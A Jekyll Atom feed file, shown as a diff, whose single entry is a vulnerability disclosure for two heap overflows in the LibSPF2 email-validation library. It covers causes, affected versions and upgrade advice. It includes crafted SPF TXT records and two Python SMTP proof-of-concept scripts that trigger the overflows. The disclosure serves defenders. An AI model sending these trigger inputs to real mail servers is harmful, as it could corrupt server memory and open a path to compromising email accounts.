@@ -1,0 +1,106 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/jekyll-theme-yat/feed.xml" rel="self" type="application/atom+xml" /><link href="/jekyll-theme-yat/" rel="alternate" type="text/html" /><updated>2024-07-27T02:37:28+00:00</updated><id>/jekyll-theme-yat/feed.xml</id><title type="html">Nota Bene[tt]</title><subtitle>The personal website and blog of Nathaniel Bennett. I write about academic research, discovered vulnerabilities, and Rust development.</subtitle><author><name>Nathaniel Bennett</name></author><entry><title type="html">CVE-2021-33912 and CVE-2021-33913: Heap overflows in email validation library LibSPF2</title><link href="/jekyll-theme-yat/cve/2022/01/18/libspf2-cve-jan-2022-disclosure.html" rel="alternate" type="text/html" title="CVE-2021-33912 and CVE-2021-33913: Heap overflows in email validation library LibSPF2" /><published>2022-01-18T00:00:00+00:00</published><updated>2022-01-18T00:00:00+00:00</updated><id>/jekyll-theme-yat/cve/2022/01/18/libspf2-cve-jan-2022-disclosure</id><content type="html" xml:base="/jekyll-theme-yat/cve/2022/01/18/libspf2-cve-jan-2022-disclosure.html"><![CDATA[<p>Two bugs related to the parsing of SPF (Sender Policy Framework) records have been found in LibSPF2, a library commonly used to determine the validity of email received to a server. One of these bugs allows for relatively flexible memory corruption in the heap, while the other affects only up to four bytes past the end of an allocated buffer. Both bugs have the potential to be used to carry out 0-click remote code execution, though modern memory defenses may reduce the possibility of such an attack. These vulnerabilities are especially important to note for servers designed to receive or exchange email, as a successful exploit would compromise the privacy and security of email accounts on a given email server. This could additionally lead to the compromise of other online accounts (such as those that would send password reset links to the compromised email account), or serve as a starting point for more sophisticated phishing/spoofing attacks. Both heap overflows can be triggered remotely by first publishing a particular TXT record for an arbitrary domain and then sending an email from that domain to an affected email server.</p>
+
+<h3 id="recommendations">Recommendations</h3>
+
+<p>Versions of LibSPF2 before 1.2.11 are affected by both of these vulnerabilities.</p>
+
+<p>If you are a mail exchange, you should check to see whether your servers use a vulnerable version of LibSPF2. You should check any anti-SPAM devices you may run in addition to mail server software.</p>
+
+<p>If you are a vendor of mail server software or anti-SPAM services, or if you manage packages for an operating system, you should determine whether LibSPF2 is used in any of your configurations and migrate to LibSPF2 1.2.11. This version can be found at:</p>
+
+<p><a href="https://github.com/shevek/libspf2/tree/8131fe140704eaae695e76b5cd09e39bd1dd220b">https://github.com/shevek/libspf2/tree/8131fe140704eaae695e76b5cd09e39bd1dd220b</a></p>
+
+<p>If you use another implementation of SPF, it is unlikely that you will be affected by this issue–the parsing bug is due to specific errors made in the LibSPF2 codebase.</p>
+
+<h3 id="details">Details</h3>
+
+<p>The Sender Policy Framework specification (<a href="https://datatracker.ietf.org/doc/html/rfc7208">RFC 7208</a>) provides several different mechanisms and macros to provide some level of flexibility for SPF policies. 
+SPF macros are expanded at the time an SPF policy is retrieved by an email server, and they are meant to represent information specific to a given email exchange (such as the HELO domain or IP address that email is being received from).</p>
+
+<p>SPF macros include several indicators that can alter the way macro expansions occur, including options that reverse and/or truncate portions of the macro expansion and an option to URL-encode the resulting string. Both vulnerabilities in LibSPF2 were found in code implementing these macro options.</p>
+
+<p><strong>CVE-2021-33912</strong> is the result of incorrect parsing in the URL-encode phase of macro expansion. During this phase, any non-ASCII or special characters are converted into their hexadecimal representation (‘ ‘ -&gt; ‘%20’, for instance); LibSPF2 does this through a call to <code class="language-plaintext highlighter-rouge">sprintf</code>. The library implicitly assumes the function will only ever output 4 characters, but certain inputs (0x80-0xff) will cause <code class="language-plaintext highlighter-rouge">sprintf</code> to overwrite 8 characters, thereby overflowing the buffer allocated to store the expansion.</p>
+
+<p>As an example, the following TXT record and SMTP query could be used to trigger a buffer overflow:</p>
+
+<p>TXT record for ‘example.com’: <code class="language-plaintext highlighter-rouge">v=spf1 %{L}.example.com -all</code></p>
+
+<p>SMTP query:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="code"><pre><span class="kn">from</span> <span class="n">smtplib</span> <span class="kn">import</span> <span class="n">SMTP</span>
+
+<span class="n">TARGET_IP</span> <span class="o">=</span> <span class="sh">'</span><span class="s">192.0.2.1</span><span class="sh">'</span>
+<span class="n">TARGET_EMAIL</span> <span class="o">=</span> <span class="sh">'</span><span class="s">example@nathanielbennett.com</span><span class="sh">'</span>
+
+<span class="k">with</span> <span class="nc">SMTP</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">TARGET_IP</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">25</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">ehlo</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="sh">"</span><span class="s">example.com</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">MAIL FROM:</span><span class="se">\xff</span><span class="s">@example.com&gt;</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">docmd</span><span class="p">(</span><span class="sh">"</span><span class="s">RCPT</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">TO:&lt;%s&gt;</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">TARGET_EMAIL</span><span class="p">,))</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">docmd</span><span class="p">(</span><span class="sh">"</span><span class="s">DATA</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nf">bytes</span><span class="p">(</span><span class="sh">"</span><span class="se">\r\n\r\n</span><span class="s">.</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">ascii</span><span class="sh">'</span><span class="p">))</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">quit</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>Note: some email server and spam filter implementations reject non-ASCII input in SMTP commands; triggering CVE-2021-33912 is a much more involved process when this is the case, though it is still possible.</p>
+
+<p><strong>CVE-2021-33913</strong> involves an error during the domain label reversal/truncation phase of macro expansion. In the event that a macro is reversed, truncated <em>and</em> URL-encoded during expansion, the buffer of the macro output is erroneously sized based on the length of the leftmost label in the domain, rather than the size of the whole domain. This means that an attacker may use a domain such as “b.AAAAAAAAAAAAAAAAAAAAAA.example.com” to overflow the heap with ‘A’ characters.</p>
+
+<p>The following TXT record and SMTP query could be used to trigger a buffer overflow:</p>
+
+<p>TXT record for ‘example.com’: <code class="language-plaintext highlighter-rouge">v=spf1 %{H5r}.example.com -all</code></p>
+
+<p>SMTP query:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="code"><pre><span class="kn">from</span> <span class="n">smtplib</span> <span class="kn">import</span> <span class="n">SMTP</span>
+
+<span class="n">TARGET_IP</span> <span class="o">=</span> <span class="sh">'</span><span class="s">192.0.2.1</span><span class="sh">'</span>
+<span class="n">TARGET_EMAIL</span> <span class="o">=</span> <span class="sh">'</span><span class="s">example@nathanielbennett.com</span><span class="sh">'</span>
+
+<span class="k">with</span> <span class="nc">SMTP</span><span class="p">()</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">TARGET_IP</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">25</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">ehlo</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="sh">"</span><span class="s">b.AAAAAAAAAAAAAAAAAAAA.example.com</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">docmd</span><span class="p">(</span><span class="sh">"</span><span class="s">MAIL</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">FROM:&lt;test.example.com&gt;</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">docmd</span><span class="p">(</span><span class="sh">"</span><span class="s">RCPT</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">TO:&lt;%s&gt;</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">TARGET_EMAIL</span><span class="p">,))</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">docmd</span><span class="p">(</span><span class="sh">"</span><span class="s">DATA</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\r\n\r\n</span><span class="s">.</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="nf">quit</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>CVE-2021-33913 provides greater control on the size of the allocated buffer, the amount of data that can be written into the heap and the byte values that can be used; as such, it is of greater concern than CVE-2021-33912.</p>
+
+<h3 id="conclusion">Conclusion</h3>
+
+<p>Email has inadvertantly become a centralized location for backup authentication–most online accounts require an email address for the purpose of having somewhere to communicate password reset links to. As such, the risks of a compromised email server are no longer limited to the loss of privacy of users’ emails. LibSPF2 is not used by any of the biggest email providors (Gmail, Microsoft, Yahoo and the like), though many smaller providers have been measured to be affected. Multiple services (including Exim) make use of the library.</p>
+
+<p>There are options for SPF validation written in memory-safe code (such as pyspf/python-policyd-spf and Mail::SPF, written in Python and Perl respectively). Both of these are up-to-date with the latest RFC. LibSPF2 hasn’t been under active development/maintenence for a couple years now–the last three commits to the code before recent CVE fixes were in 2017, 2016 and 2015. The sensible recommendation may be to switch configurations to one of the above implementations if your email server currently uses LibSPF2. It’s just too easy for vulnerabilities to pop up in C code, especially when it comes to string parsing.</p>
+
+<p>Special thanks goes to shevek, Paulo Smorigo and the IMAAL lab for all the help with patching and measuring these vulnerabilities!</p>
+
+<!--No thanks goes to Facebook, who awarded a bug bounty of $0 upon receiving an early notification of these vulnerabilities being present in their system.-->]]></content><author><name>Nathaniel Bennett</name></author><category term="CVE" /><category term="spf" /><category term="email" /><summary type="html"><![CDATA[Two bugs related to the parsing of SPF (Sender Policy Framework) records have been found in LibSPF2, a library commonly used to determine the validity of email received to a server. One of these bugs allows for relatively flexible memory corruption in the heap, while the other affects only up to four bytes past the end of an allocated buffer. Both bugs have the potential to be used to carry out 0-click remote code execution, though modern memory defenses may reduce the possibility of such an attack. These vulnerabilities are especially important to note for servers designed to receive or exchange email, as a successful exploit would compromise the privacy and security of email accounts on a given email server. This could additionally lead to the compromise of other online accounts (such as those that would send password reset links to the compromised email account), or serve as a starting point for more sophisticated phishing/spoofing attacks. Both heap overflows can be triggered remotely by first publishing a particular TXT record for an arbitrary domain and then sending an email from that domain to an affected email server.]]></summary></entry></feed>
